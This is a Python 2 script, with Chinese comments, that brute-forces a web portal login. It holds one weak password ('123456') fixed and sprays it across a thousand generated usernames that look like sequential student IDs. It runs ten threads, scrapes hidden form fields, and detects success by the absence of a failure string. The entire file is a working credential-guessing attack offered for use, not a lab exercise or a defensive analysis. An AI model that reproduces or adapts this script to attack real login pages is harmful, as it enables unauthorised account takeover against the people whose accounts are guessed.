#!/usr/bin/env python
# -*- encoding:utf-8 -*-
# author: KevAxe
# email: kevaxe@qq.com

import urllib2
import urllib
import cookielib
import threading 
import sys
import Queue
from HTMLParser import HTMLParser

user_thread = 10
password = '123456' #使用123456作为密码去爆破用户名
resume = None

target_url = 'http://portal.xxx.com/login'  #登录页面
target_post = 'http://portal.xxx.com/login' #登录请求处理页面

username_field = 'inputname' #爆破字段name值
username_field2 = 'username'
password_field = 'password'

failed_check = 'DCPLogin'
#匹配所有表单中的input
class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self,tag,attrs):
		if tag == 'input':
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == 'name':
					tag_name = value
				if name == 'value':
					tag_value = value
				if tag_name is not None:
					self.tag_results[tag_name] = tag_value

class Bruter(object):
	def __init__(self,username,password):
		self.username_q = username
		self.password = password
		self.found = False

		print 'Finished setting up for password: %s' % password

	def run_bruteforce(self):
		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.username_q.empty() and not self.found:
			brute = self.username_q.get().rstrip()
			jar = cookielib.FileCookieJar('Cookies')
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

			response = opener.open(target_url)
			page = response.read()

			print "Trying:%s :%s (%d left)" % (brute,self.password,self.username_q.qsize())

			#解析隐藏区域
			parser = BruteParser()
			parser.feed(page)

			post_tags = parser.tag_results

			post_tags[username_field] = brute #为需要爆破的字段重新赋值
			post_tags[password_field] = self.password
			post_tags[username_field2] = brute

			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post,login_data)
			login_result = login_response.read()

			if failed_check not in login_result:
				self.found = True
				print "[*] Bruteforce successful."
				print "[*] username: %s" % brute
				print "[*] Password: %s" % password
				print "[*] Waiting for other threads to exit..."


if __name__ == '__main__':
	#建立用户名字典，生成队列
	def build_wordlist():
		found_resume = False
		username = Queue.Queue()
		for name_suffix in range(0,1000):
			name_suffix = '201365' + str(name_suffix).zfill(3)
			if resume is not None:
				if found_resume:
					username.put(name_suffix)
				else:
					if username == resume:
						found_resume = True
						print 'Resuming wordlist from: %s' % resume
			else:
				username.put(name_suffix)
		return username

	username = build_wordlist()

	bruter_obj = Bruter(username,password)
	bruter_obj.run_bruteforce()





